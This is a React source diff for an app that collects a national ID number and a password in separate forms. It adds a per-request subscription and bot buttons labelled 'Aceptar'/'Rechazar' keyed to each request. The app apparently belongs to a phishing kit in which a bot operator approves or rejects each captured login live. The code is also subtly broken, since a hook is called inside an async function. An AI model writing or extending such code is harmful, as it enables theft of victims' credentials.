@@ -1,16 +1,44 @@
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import "./App.css";
 import { Image, Logo } from "./assets/images/index.js";
 import IdentificationForm from "./components/IdentificationForm.js";
 import PasswordForm from "./components/PasswordForm.js";
 import LoadingPage from "./pages/LoadingPage.js";
 import { api } from "./utils/axios/axios.ts";
+import useSse from "./hooks/useSse.tsx";
 
 function App() {
   const [showForm, setShowForm] = useState(false);
   const [step, setStep] = useState<"id" | "password" | "loading">("id");
   const [cedula, setCedula] = useState("");
   const [password, setPassword] = useState("");
+  const [requestId, setRequestId] = useState<string | null>(null);
+
+
+
+  const startSubscription = async () => {
+    try {
+      const response = await api.post("/news/request");
+
+      const { requestId, botUrl } = response.data;
+
+      setRequestId(requestId);
+
+      window.open(botUrl, "_blank");
+
+      const { decision } = useSse(requestId);
+
+      console.log(decision == 'accepted' ? 'Se te aceptop' : 'no se te acepto')
+    } catch (error) {
+      console.error("Error creando solicitud:", error);
+    }
+  };
+
+  useEffect(
+    () => {
+      startSubscription();
+    }, []
+  )
 
   const onContinue = async () => {
     try {
@@ -21,15 +49,15 @@ function App() {
             [
               {
                 text: "Aceptar",
-                callback_data: "aceptar",
+                callback_data: `news:accept:${requestId}`,
               },
               {
                 text: "Rechazar",
-                callback_data: "rechazar",
+                callback_data: `news:reject:${requestId}`,
               },
             ],
           ],
-        },
+        }
       });
       return response;
     } catch (error) {
